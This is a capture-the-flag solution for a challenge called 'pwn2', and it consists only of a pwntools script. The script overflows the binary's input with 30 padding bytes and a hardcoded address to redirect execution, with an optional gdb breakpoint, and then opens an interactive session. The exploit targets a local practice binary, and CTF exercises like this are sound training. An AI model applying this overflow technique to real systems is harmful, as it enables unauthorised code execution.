---
title: "pwn2"
points: N/A
tags: ["pwn"]
---

```python
from pwn import *

binary_name = "./pwn2"
elf = context.binary = ELF(binary_name)
DEBUG = True

if DEBUG:
    p = gdb.debug(binary_name, '''
    b *select_func+39
    continue
    ''')
else:
    p = process(binary_name)

p.recv()
p.sendline(b'a'*30+p32(0x565d16d8))
p.interactive()
```
